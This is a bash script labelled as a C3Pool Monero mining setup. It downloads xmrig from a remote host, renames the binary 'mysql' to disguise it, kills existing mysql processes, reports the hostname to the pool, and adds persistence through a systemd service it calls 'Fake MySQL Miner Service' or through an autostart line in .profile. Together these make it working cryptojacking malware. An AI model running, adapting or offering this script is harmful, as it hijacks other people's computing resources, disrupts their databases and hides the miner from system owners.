#!/bin/bash

VERSION=3.0

echo "C3Pool mining setup script v$VERSION."
echo

# arguments
WALLET=$1
EMAIL=$2

if [ -z $WALLET ]; then
  echo "Usage: $0 <wallet> [email]"
  exit 1
fi

INSTALL_DIR="$HOME/.local/c3pool"

# cleanup
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service 2>/dev/null
fi
killall -9 mysql 2>/dev/null
rm -rf "$INSTALL_DIR"

mkdir -p "$INSTALL_DIR"

# download miner
echo "[*] Downloading xmrig..."
curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz
tar xf /tmp/xmrig.tar.gz -C "$INSTALL_DIR"
rm /tmp/xmrig.tar.gz

# rename xmrig binary to mysql
mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/mysql"

# patch config
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' "$INSTALL_DIR/config.json"

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))

PORT=13333
[ $EXP_MONERO_HASHRATE -le 5000 ] && PORT=80
[ $EXP_MONERO_HASHRATE -gt 5000 ] && [ $EXP_MONERO_HASHRATE -le 25000 ] && PORT=13333
[ $EXP_MONERO_HASHRATE -gt 25000 ] && [ $EXP_MONERO_HASHRATE -le 50000 ] && PORT=15555
[ $EXP_MONERO_HASHRATE -gt 50000 ] && [ $EXP_MONERO_HASHRATE -le 100000 ] && PORT=19999
[ $EXP_MONERO_HASHRATE -gt 100000 ] && PORT=23333

PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
[ "$PASS" == "localhost" ] && PASS=$(ip route get 1 | awk '{print $NF;exit}')
[ -z $PASS ] && PASS=na
[ ! -z $EMAIL ] && PASS="$PASS:$EMAIL"

sed -i 's#"url": *"[^"]*"#"url": "auto.c3pool.org:'$PORT'"#' "$INSTALL_DIR/config.json"
sed -i 's#"user": *"[^"]*"#"user": "'$WALLET'"#' "$INSTALL_DIR/config.json"
sed -i 's#"pass": *"[^"]*"#"pass": "'$PASS'"#' "$INSTALL_DIR/config.json"
sed -i 's#"log-file": *null,#"log-file": "'$INSTALL_DIR/mysql.log'",#' "$INSTALL_DIR/config.json"

cp "$INSTALL_DIR/config.json" "$INSTALL_DIR/config_background.json"
sed -i 's/"background": *false,/"background": true,/' "$INSTALL_DIR/config_background.json"

# miner.sh wrapper
cat >"$INSTALL_DIR/miner.sh" <<EOL
#!/bin/bash
if ! pidof mysql >/dev/null; then
  nice $INSTALL_DIR/mysql \$*
else
  echo "Miner already running."
fi
EOL
chmod +x "$INSTALL_DIR/miner.sh"

# create systemd service
if type systemctl >/dev/null 2>&1; then
  echo "[*] Installing systemd service"
  cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Fake MySQL Miner Service
After=network.target

[Service]
ExecStart=$INSTALL_DIR/mysql --config=$INSTALL_DIR/config.json
Restart=always
Nice=10
CPUWeight=1
LimitNOFILE=1048576
LimitMEMLOCK=infinity

[Install]
WantedBy=multi-user.target
EOL

  sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
  sudo systemctl daemon-reload
  sudo systemctl enable c3pool_miner.service
  sudo systemctl start c3pool_miner.service
  echo "Miner installed as systemd service (runs as mysql)."
else
  echo "[*] systemd not found, fallback to .profile autostart"
  if ! grep "$INSTALL_DIR/miner.sh" "$HOME/.profile" >/dev/null; then
    echo "$INSTALL_DIR/miner.sh --config=$INSTALL_DIR/config_background.json >/dev/null 2>&1 &" >>"$HOME/.profile"
  fi
  "$INSTALL_DIR/miner.sh" --config="$INSTALL_DIR/config_background.json" >/dev/null 2>&1 &
fi

echo "[*] Setup complete. Binary: $INSTALL_DIR/mysql"
